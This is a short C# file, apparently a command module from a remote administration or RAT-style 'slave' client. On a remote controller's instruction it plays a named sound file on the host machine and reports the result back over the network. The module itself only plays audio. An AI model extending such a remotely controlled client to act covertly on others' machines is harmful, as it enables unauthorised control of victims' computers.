using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.Media;

namespace Slave.Commands
{
    internal class PlaySound : ICommand
    {
        public string name { get; } = "playsound";

        public void Process(List<string> args)
        {
            var filename = args[0];

            if (!File.Exists(filename))
            {
                SlaveCommandsManager.networkManager.WriteLine("FileError");
                return;
            }

            try
            {
                var player = new SoundPlayer(filename);
                player.Play();
                SlaveCommandsManager.networkManager.WriteLine("OK");
            }
            catch (InvalidOperationException)
            {
                SlaveCommandsManager.networkManager.WriteLine("InvalidFormat");
            }
        }
    }
}
